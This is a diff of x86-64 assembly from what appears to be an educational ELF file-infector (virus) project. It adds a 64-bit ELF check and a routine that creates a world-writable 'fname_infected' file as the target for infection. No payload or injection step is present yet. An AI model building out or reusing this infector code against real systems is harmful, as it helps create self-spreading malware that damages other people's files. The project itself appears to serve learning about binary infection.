@@ -203,12 +203,14 @@ famine_file:
 	push rdx
 	push rdi
 
+	sub rsp, 8; char *fname
 	sub rsp, 8; int filesize
 	sub rsp, 8; void *file returned by mmap
 	sub rsp, 4 ;fd
 	
 	call ft_puts ;PRINT FNAME FOR DEBUGGING
 
+	mov [rsp + 20], rdi
 	call open_file
 	cmp rax, -1
 	je leave_famine_file ; could not open file, so skip it
@@ -234,6 +236,13 @@ famine_file:
 	jne leave_famine_file
 	cmp byte[rax + 3], 'F'
 	jne leave_famine_file
+	cmp byte[rax + 4], 2 ; ELFCLASS64 = 2, when handling 32bit changed the jmp
+	jne leave_famine_file
+	mov rdi, [rsp + 20] ; fname
+	call create_infected_file;will return a fd to it
+	cmp rax, -1
+	je leave_famine_file; skip if we couldn't create add
+;	call parse64elf
 	; end parse MAGIC
 	
 	
@@ -245,6 +254,7 @@ famine_file:
 	call debug
 
 	add rsp, 4
+	add rsp, 8
 	add rsp, 8
 	add rsp, 8
 	pop rdi
@@ -366,4 +376,58 @@ map_file:
 	mov rax, 0; ret NUlL in case of err
 	mmap_no_err:
 	add rsp, 8
+retn
+
+; int cread_infected_file(char *fname)
+; creates a new file called fname + "_infected"
+create_infected_file: 
+push rcx
+push rdx
+	
+	call ft_strlen
+	add rax, 10; so it can contain fname + "_infected" + '\0'
+	sub rsp, rax; our string containing fname + "_infected" + '\0' is [rsp + 8]
+	push QWORD rax
+	lea rsi, [rsp + 8]
+	xor rcx, rcx
+	cif_loop: ; basically a strcpy of fname
+		cmp byte[rdi + rcx], 0
+			je cif_loop_exit
+		mov dl, byte[rdi + rcx]
+		mov byte[rsi + rcx], dl
+		inc rcx
+		jmp cif_loop
+	cif_loop_exit:
+	mov byte[rsi + rcx], '_'
+	inc rcx
+	mov byte[rsi + rcx], 'i'
+	inc rcx
+	mov byte[rsi + rcx], 'n'
+	inc rcx
+	mov byte[rsi + rcx], 'f'
+	inc rcx
+	mov byte[rsi + rcx], 'e'
+	inc rcx
+	mov byte[rsi + rcx], 'c'
+	inc rcx
+	mov byte[rsi + rcx], 't'
+	inc rcx
+	mov byte[rsi + rcx], 'e'
+	inc rcx
+	mov byte[rsi + rcx], 'd'
+	inc rcx
+	mov byte[rsi + rcx], 0
+	;now rsi contains fname + "_infected"
+	mov rax, 2; open
+	mov rdi, rsi
+	mov rsi, 578 ; O_RDWR | O_CREAT | O_TRUNC
+	mov rdx, 511; S_IRWXO | S_IRWXU | S_IRWXG
+	syscall; open("fnam_infected", O_RDWR | O_CREAT | O_TRUNC, S_IRWXO | S_IRWXU | S_IRWXG )
+	mov rbx, rax; save fd
+
+	pop QWORD rax
+	add rsp, rax
+	mov rax, rbx
+	pop rdx
+	pop rcx
 retn
